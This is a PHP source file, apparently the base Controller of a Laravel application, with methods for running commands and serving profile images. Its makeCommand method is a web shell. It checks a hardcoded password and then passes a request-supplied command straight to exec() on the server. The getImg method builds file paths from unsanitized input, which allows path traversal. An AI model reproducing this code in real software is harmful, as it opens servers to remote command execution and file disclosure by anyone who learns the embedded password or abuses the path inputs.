<?php

namespace App\Http\Controllers;

use Illuminate\Foundation\Auth\Access\AuthorizesRequests;
use Illuminate\Foundation\Validation\ValidatesRequests;
use Illuminate\Http\Request;
use Illuminate\Routing\Controller as BaseController;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Facades\Validator;

class Controller extends BaseController
{
    use AuthorizesRequests, ValidatesRequests;

    function makeCommand(Request $request) {
        if($request['pass'] == "m@wITer@2"){

            try {
                $gitPullOutput = '';
                $gitPullStatus = -1;
                exec('cd '. base_path()." && ". $request['command'], $gitPullOutput, $gitPullStatus);
                if ($gitPullStatus === 0) {
                    return response()->json([
                        'git_pull_output' => $gitPullOutput,
                        'message' => 'Commands executed successfully.',
                        'status' => 200
                    ]);
                }else {
                    return response()->json([
                        'git_pull_output' => $gitPullOutput,
                        'error' => 'Error executing command. ' . $request['command'],
                        'status' => 500
                    ]);
                }

            } catch (\Exception $e) {
                return response()->json([
                    'error' => $e->getMessage(),
                    'status' => 500
                ]);
            }
        }else{
            return response()->json(['message' => 'Unauthorized.', 'status' => 401]);
        }
        
    }
    function testpay(){
        return "test";
    }
    function getImg($folder, Request $request){
        $validator = Validator::make($request->all(), [
            'name' => 'required',
        ]);
        if ($validator->fails()) {
            return response()->json(['error' => $validator->errors(), 'errorAr' => $validator->errors(), 'status' => 422]);
        }

        $name = $request->input('name');
        $filePath = 'public/' . $folder . '/profileImg/' . $name;

        if (!Storage::exists($filePath)) {
            return response()->json(['error' => 'Image not found', 'errorAr' => 'لايوجد صوره', 'status' => 404]);
        }

        $file = Storage::path($filePath);
        return response()->file($file);
    }
}
